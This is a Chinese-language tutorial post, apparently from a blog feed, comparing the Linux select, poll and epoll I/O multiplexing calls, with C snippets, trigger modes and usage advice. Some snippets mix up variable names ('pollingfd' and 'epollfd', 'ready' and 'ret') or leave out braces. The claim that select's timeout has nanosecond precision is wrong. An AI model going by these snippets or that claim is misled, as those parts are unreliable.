<p>文件描述符在形式上是一个非负整数。实际上，它是一个索引值，指向内核为每一个进程所维护的该进程打开文件的记录表。当程序打开一个现有文件或者创建一个新文件时，内核向进程返回一个文件描述符。在程序设计中，一些涉及底层的程序编写往往会围绕着文件描述符展开。但是文件描述符这一概念往往只适用于UNIX、Linux这样的操作系统。</p>
<h2 id="select" tabindex="-1"> select</h2>
<div><pre><code><span>int</span> <span>select</span><span>(</span><span>int</span> n<span>,</span> fd_set <span>*</span>readfds<span>,</span> fd_set <span>*</span>writefds<span>,</span> fd_set <span>*</span>exceptfds<span>,</span> <span>struct</span> <span>timeval</span> <span>*</span>timeout<span>)</span><span>;</span>
</code></pre></div><p>select 允许应用程序监视一组文件描述符，等待一个或者多个描述符成为就绪状态，从而完成 I/O 操作。</p>
<ul>
<li>
<p>fd_set 使用数组实现，数组大小使用 FD_SETSIZE 定义，所以只能监听少于 FD_SETSIZE 数量的描述符。有三种类型的描述符类型：readset、writeset、exceptset，分别对应读、写、异常条件的描述符集合。</p>
</li>
<li>
<p>timeout 为超时参数，调用 select 会一直阻塞直到有描述符的事件到达或者等待的时间超过 timeout。</p>
</li>
<li>
<p>成功调用返回结果大于 0，出错返回结果为 -1，超时返回结果为 0。</p>
</li>
</ul>
<div><pre><code>fd_set fd_in<span>,</span> fd_out<span>;</span>
<span>struct</span> <span>timeval</span> tv<span>;</span>

<span>// Reset the sets</span>
<span>FD_ZERO</span><span>(</span> <span>&amp;</span>fd_in <span>)</span><span>;</span>
<span>FD_ZERO</span><span>(</span> <span>&amp;</span>fd_out <span>)</span><span>;</span>

<span>// Monitor sock1 for input events</span>
<span>FD_SET</span><span>(</span> sock1<span>,</span> <span>&amp;</span>fd_in <span>)</span><span>;</span>

<span>// Monitor sock2 for output events</span>
<span>FD_SET</span><span>(</span> sock2<span>,</span> <span>&amp;</span>fd_out <span>)</span><span>;</span>

<span>// Find out which socket has the largest numeric value as select requires it</span>
<span>int</span> largest_sock <span>=</span> sock1 <span>></span> sock2 <span>?</span> sock1 <span>:</span> sock2<span>;</span>

<span>// Wait up to 10 seconds</span>
tv<span>.</span>tv_sec <span>=</span> <span>10</span><span>;</span>
tv<span>.</span>tv_usec <span>=</span> <span>0</span><span>;</span>

<span>// Call the select</span>
<span>int</span> ret <span>=</span> <span>select</span><span>(</span> largest_sock <span>+</span> <span>1</span><span>,</span> <span>&amp;</span>fd_in<span>,</span> <span>&amp;</span>fd_out<span>,</span> <span>NULL</span><span>,</span> <span>&amp;</span>tv <span>)</span><span>;</span>

<span>// Check if select actually succeed</span>
<span>if</span> <span>(</span> ret <span>==</span> <span>-</span><span>1</span> <span>)</span>
    <span>// report error and abort</span>
<span>else</span> <span>if</span> <span>(</span> ret <span>==</span> <span>0</span> <span>)</span>
    <span>// timeout; no event detected</span>
<span>else</span>
<span>{</span>
    <span>if</span> <span>(</span> <span>FD_ISSET</span><span>(</span> sock1<span>,</span> <span>&amp;</span>fd_in <span>)</span> <span>)</span>
        <span>// input event on sock1</span>

    <span>if</span> <span>(</span> <span>FD_ISSET</span><span>(</span> sock2<span>,</span> <span>&amp;</span>fd_out <span>)</span> <span>)</span>
        <span>// output event on sock2</span>
<span>}</span>
</code></pre><div aria-hidden="true"><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br><span>9</span><br><span>10</span><br><span>11</span><br><span>12</span><br><span>13</span><br><span>14</span><br><span>15</span><br><span>16</span><br><span>17</span><br><span>18</span><br><span>19</span><br><span>20</span><br><span>21</span><br><span>22</span><br><span>23</span><br><span>24</span><br><span>25</span><br><span>26</span><br><span>27</span><br><span>28</span><br><span>29</span><br><span>30</span><br><span>31</span><br><span>32</span><br><span>33</span><br><span>34</span><br><span>35</span><br><span>36</span><br></div></div><h2 id="poll" tabindex="-1"> poll</h2>
<div><pre><code><span>int</span> <span>poll</span><span>(</span><span>struct</span> <span>pollfd</span> <span>*</span>fds<span>,</span> <span>unsigned</span> <span>int</span> nfds<span>,</span> <span>int</span> timeout<span>)</span><span>;</span>
</code></pre></div><p>poll 的功能与 select 类似，也是等待一组描述符中的一个成为就绪状态。</p>
<p>poll 中的描述符是 pollfd 类型的数组，pollfd 的定义如下：</p>
<div><pre><code><span>struct</span> <span>pollfd</span> <span>{</span>
               <span>int</span>   fd<span>;</span>         <span>/* file descriptor */</span>
               <span>short</span> events<span>;</span>     <span>/* requested events */</span>
               <span>short</span> revents<span>;</span>    <span>/* returned events */</span>
           <span>}</span><span>;</span>
</code></pre></div><div><pre><code><span>// The structure for two events</span>
<span>struct</span> <span>pollfd</span> fds<span>[</span><span>2</span><span>]</span><span>;</span>

<span>// Monitor sock1 for input</span>
fds<span>[</span><span>0</span><span>]</span><span>.</span>fd <span>=</span> sock1<span>;</span>
fds<span>[</span><span>0</span><span>]</span><span>.</span>events <span>=</span> POLLIN<span>;</span>

<span>// Monitor sock2 for output</span>
fds<span>[</span><span>1</span><span>]</span><span>.</span>fd <span>=</span> sock2<span>;</span>
fds<span>[</span><span>1</span><span>]</span><span>.</span>events <span>=</span> POLLOUT<span>;</span>

<span>// Wait 10 seconds</span>
<span>int</span> ret <span>=</span> <span>poll</span><span>(</span> <span>&amp;</span>fds<span>,</span> <span>2</span><span>,</span> <span>10000</span> <span>)</span><span>;</span>
<span>// Check if poll actually succeed</span>
<span>if</span> <span>(</span> ret <span>==</span> <span>-</span><span>1</span> <span>)</span>
    <span>// report error and abort</span>
<span>else</span> <span>if</span> <span>(</span> ret <span>==</span> <span>0</span> <span>)</span>
    <span>// timeout; no event detected</span>
<span>else</span>
<span>{</span>
    <span>// If we detect the event, zero it out so we can reuse the structure</span>
    <span>if</span> <span>(</span> fds<span>[</span><span>0</span><span>]</span><span>.</span>revents <span>&amp;</span> POLLIN <span>)</span>
        fds<span>[</span><span>0</span><span>]</span><span>.</span>revents <span>=</span> <span>0</span><span>;</span>
        <span>// input event on sock1</span>

    <span>if</span> <span>(</span> fds<span>[</span><span>1</span><span>]</span><span>.</span>revents <span>&amp;</span> POLLOUT <span>)</span>
        fds<span>[</span><span>1</span><span>]</span><span>.</span>revents <span>=</span> <span>0</span><span>;</span>
        <span>// output event on sock2</span>
<span>}</span>
</code></pre><div aria-hidden="true"><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br><span>9</span><br><span>10</span><br><span>11</span><br><span>12</span><br><span>13</span><br><span>14</span><br><span>15</span><br><span>16</span><br><span>17</span><br><span>18</span><br><span>19</span><br><span>20</span><br><span>21</span><br><span>22</span><br><span>23</span><br><span>24</span><br><span>25</span><br><span>26</span><br><span>27</span><br><span>28</span><br><span>29</span><br></div></div><h2 id="比较" tabindex="-1"> 比较</h2>
<h3 id="_1-功能" tabindex="-1"> 1. 功能</h3>
<p>select 和 poll 的功能基本相同，不过在一些实现细节上有所不同。</p>
<ul>
<li>select 会修改描述符，而 poll 不会；</li>
<li>select 的描述符类型使用数组实现，FD_SETSIZE 大小默认为 1024，因此默认只能监听 1024 个描述符。如果要监听更多描述符的话，需要修改 FD_SETSIZE 之后重新编译；而 poll 没有描述符数量的限制；</li>
<li>poll 提供了更多的事件类型，并且对描述符的重复利用上比 select 高。</li>
<li>如果一个线程对某个描述符调用了 select 或者 poll，另一个线程关闭了该描述符，会导致调用结果不确定。</li>
</ul>
<h3 id="_2-速度" tabindex="-1"> 2. 速度</h3>
<p>select 和 poll 速度都比较慢，每次调用都需要将全部描述符从应用进程缓冲区复制到内核缓冲区。</p>
<p>select 和 poll 的返回结果中没有声明哪些描述符已经准备好，所以如果返回值大于 0 时，应用进程都需要使用轮询的方式来找到 I/O 完成的描述符</p>
<h3 id="_3-可移植性" tabindex="-1"> 3. 可移植性</h3>
<p>几乎所有的系统都支持 select，但是只有比较新的系统支持 poll。</p>
<h2 id="epoll" tabindex="-1"> epoll</h2>
<div><pre><code><span>int</span> <span>epoll_create</span><span>(</span><span>int</span> size<span>)</span><span>;</span>
<span>int</span> <span>epoll_ctl</span><span>(</span><span>int</span> epfd<span>,</span> <span>int</span> op<span>,</span> <span>int</span> fd<span>,</span> <span>struct</span> <span>epoll_event</span> <span>*</span>event<span>)</span>；
<span>int</span> <span>epoll_wait</span><span>(</span><span>int</span> epfd<span>,</span> <span>struct</span> <span>epoll_event</span> <span>*</span> events<span>,</span> <span>int</span> maxevents<span>,</span> <span>int</span> timeout<span>)</span><span>;</span>
</code></pre></div><p><a href="https://www.cnblogs.com/Joy-Hu/p/10762239.html" target="_blank" rel="noopener noreferrer">epoll本质</a></p>
<p>epoll_ctl() 用于向内核注册新的描述符或者是改变某个文件描述符的状态。已注册的描述符在内核中会被维护在一棵红黑树上，通过回调函数内核会将 I/O 准备好的描述符加入到一个链表中管理，进程调用 epoll_wait() 便可以得到事件完成的描述符。</p>
<p>从上面的描述可以看出，epoll 只需要将描述符从进程缓冲区向内核缓冲区拷贝一次，并且进程不需要通过轮询来获得事件完成的描述符。</p>
<p>epoll 仅适用于 Linux OS。</p>
<p>epoll 比 select 和 poll 更加灵活而且没有描述符数量限制。</p>
<p>epoll 对多线程编程更有友好，一个线程调用了 epoll_wait() 另一个线程关闭了同一个描述符也不会产生像 select 和 poll 的不确定情况。</p>
<div><pre><code><span>// Create the epoll descriptor. Only one is needed per app, and is used to monitor all sockets.</span>
<span>// The function argument is ignored (it was not before, but now it is), so put your favorite number here</span>
<span>int</span> pollingfd <span>=</span> <span>epoll_create</span><span>(</span> <span>0xCAFE</span> <span>)</span><span>;</span>

<span>if</span> <span>(</span> pollingfd <span>&lt;</span> <span>0</span> <span>)</span>
 <span>// report error</span>

<span>// Initialize the epoll structure in case more members are added in future</span>
<span>struct</span> <span>epoll_event</span> ev <span>=</span> <span>{</span> <span>0</span> <span>}</span><span>;</span>

<span>// Associate the connection class instance with the event. You can associate anything</span>
<span>// you want, epoll does not use this information. We store a connection class pointer, pConnection1</span>
ev<span>.</span>data<span>.</span>ptr <span>=</span> pConnection1<span>;</span>

<span>// Monitor for input, and do not automatically rearm the descriptor after the event</span>
ev<span>.</span>events <span>=</span> EPOLLIN <span>|</span> EPOLLONESHOT<span>;</span>
<span>// Add the descriptor into the monitoring list. We can do it even if another thread is</span>
<span>// waiting in epoll_wait - the descriptor will be properly added</span>
<span>if</span> <span>(</span> <span>epoll_ctl</span><span>(</span> epollfd<span>,</span> EPOLL_CTL_ADD<span>,</span> pConnection1<span>-></span><span>getSocket</span><span>(</span><span>)</span><span>,</span> <span>&amp;</span>ev <span>)</span> <span>!=</span> <span>0</span> <span>)</span>
    <span>// report error</span>

<span>// Wait for up to 20 events (assuming we have added maybe 200 sockets before that it may happen)</span>
<span>struct</span> <span>epoll_event</span> pevents<span>[</span> <span>20</span> <span>]</span><span>;</span>

<span>// Wait for 10 seconds, and retrieve less than 20 epoll_event and store them into epoll_event array</span>
<span>int</span> ready <span>=</span> <span>epoll_wait</span><span>(</span> pollingfd<span>,</span> pevents<span>,</span> <span>20</span><span>,</span> <span>10000</span> <span>)</span><span>;</span>
<span>// Check if epoll actually succeed</span>
<span>if</span> <span>(</span> ret <span>==</span> <span>-</span><span>1</span> <span>)</span>
    <span>// report error and abort</span>
<span>else</span> <span>if</span> <span>(</span> ret <span>==</span> <span>0</span> <span>)</span>
    <span>// timeout; no event detected</span>
<span>else</span>
<span>{</span>
    <span>// Check if any events detected</span>
    <span>for</span> <span>(</span> <span>int</span> i <span>=</span> <span>0</span><span>;</span> i <span>&lt;</span> ret<span>;</span> i<span>++</span> <span>)</span>
    <span>{</span>
        <span>if</span> <span>(</span> pevents<span>[</span>i<span>]</span><span>.</span>events <span>&amp;</span> EPOLLIN <span>)</span>
        <span>{</span>
            <span>// Get back our connection pointer</span>
            Connection <span>*</span> c <span>=</span> <span>(</span>Connection<span>*</span><span>)</span> pevents<span>[</span>i<span>]</span><span>.</span>data<span>.</span>ptr<span>;</span>
            c<span>-></span><span>handleReadEvent</span><span>(</span><span>)</span><span>;</span>
         <span>}</span>
    <span>}</span>
<span>}</span>
</code></pre><div aria-hidden="true"><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br><span>9</span><br><span>10</span><br><span>11</span><br><span>12</span><br><span>13</span><br><span>14</span><br><span>15</span><br><span>16</span><br><span>17</span><br><span>18</span><br><span>19</span><br><span>20</span><br><span>21</span><br><span>22</span><br><span>23</span><br><span>24</span><br><span>25</span><br><span>26</span><br><span>27</span><br><span>28</span><br><span>29</span><br><span>30</span><br><span>31</span><br><span>32</span><br><span>33</span><br><span>34</span><br><span>35</span><br><span>36</span><br><span>37</span><br><span>38</span><br><span>39</span><br><span>40</span><br><span>41</span><br><span>42</span><br><span>43</span><br><span>44</span><br></div></div><h2 id="工作模式" tabindex="-1"> 工作模式</h2>
<p>epoll 的描述符事件有两种触发模式：LT（level trigger）和 ET（edge trigger）。</p>
<h3 id="_1-lt-模式" tabindex="-1"> 1. LT 模式</h3>
<p>当 epoll_wait() 检测到描述符事件到达时，将此事件通知进程，进程可以不立即处理该事件，下次调用 epoll_wait() 会再次通知进程。是默认的一种模式，并且同时支持 Blocking 和 No-Blocking。</p>
<h3 id="_2-et-模式" tabindex="-1"> 2. ET 模式</h3>
<p>和 LT 模式不同的是，通知之后进程必须立即处理事件，下次再调用 epoll_wait() 时不会再得到事件到达的通知。</p>
<p>很大程度上减少了 epoll 事件被重复触发的次数，因此效率要比 LT 模式高。只支持 No-Blocking，以避免由于一个文件句柄的阻塞读/阻塞写操作把处理多个文件描述符的任务饿死。</p>
<h2 id="应用场景" tabindex="-1"> 应用场景</h2>
<p>很容易产生一种错觉认为只要用 epoll 就可以了，select 和 poll 都已经过时了，其实它们都有各自的使用场景。</p>
<h3 id="_1-select-应用场景" tabindex="-1"> 1. select 应用场景</h3>
<p>select 的 timeout 参数精度为 1ns，而 poll 和 epoll 为 1ms，因此 select 更加适用于实时性要求比较高的场景，比如核反应堆的控制。</p>
<p>select 可移植性更好，几乎被所有主流平台所支持。</p>
<h3 id="_2-poll-应用场景" tabindex="-1"> 2. poll 应用场景</h3>
<p>poll 没有最大描述符数量的限制，如果平台支持并且对实时性要求不高，应该使用 poll 而不是 select。</p>
<h3 id="_3-epoll-应用场景" tabindex="-1"> 3. epoll 应用场景</h3>
<p>只需要运行在 Linux 平台上，有大量的描述符需要同时轮询，并且这些连接最好是长连接。</p>
<p>需要同时监控小于 1000 个描述符，就没有必要使用 epoll，因为这个应用场景下并不能体现 epoll 的优势。</p>
<p>需要监控的描述符状态变化多，而且都是非常短暂的，也没有必要使用 epoll。因为 epoll 中的所有描述符都存储在内核中，造成每次需要对描述符的状态改变都需要通过 epoll_ctl() 进行系统调用，频繁系统调用降低效率。并且 epoll 的描述符存储在内核，不容易调试。</p>
<h1 id="参考资料" tabindex="-1"> 参考资料</h1>
<ul>
<li>Stevens W R, Fenner B, Rudoff A M. UNIX network programming[M]. Addison-Wesley Professional, 2004.</li>
<li>http://man7.org/linux/man-pages/man2/select.2.html</li>
<li>http://man7.org/linux/man-pages/man2/poll.2.html</li>
<li><a href="https://www.ibm.com/developerworks/linux/library/l-async/" target="_blank" rel="noopener noreferrer">Boost application performance using asynchronous I/O</a></li>
<li><a href="https://msdn.microsoft.com/en-us/library/windows/desktop/aa365683(v=vs.85).aspx" target="_blank" rel="noopener noreferrer">Synchronous and Asynchronous I/O</a></li>
<li><a href="https://segmentfault.com/a/1190000003063859" target="_blank" rel="noopener noreferrer">Linux IO 模式及 select、poll、epoll 详解</a></li>
<li><a href="https://daniel.haxx.se/docs/poll-vs-select.html" target="_blank" rel="noopener noreferrer">poll vs select vs event-based</a></li>
<li><a href="http://www.ulduzsoft.com/2014/01/select-poll-epoll-practical-difference-for-system-architects/" target="_blank" rel="noopener noreferrer">select / poll / epoll: practical difference for system architects</a></li>
<li><a href="https://code.woboq.org/userspace/glibc/sysdeps/unix/sysv/linux/" target="_blank" rel="noopener noreferrer">Browse the source code of userspace/glibc/sysdeps/unix/sysv/linux/ online</a></li>
</ul>
]]></content>
    <published>2022-05-16T04:59:52.000Z</published>
  </entry>
</feed>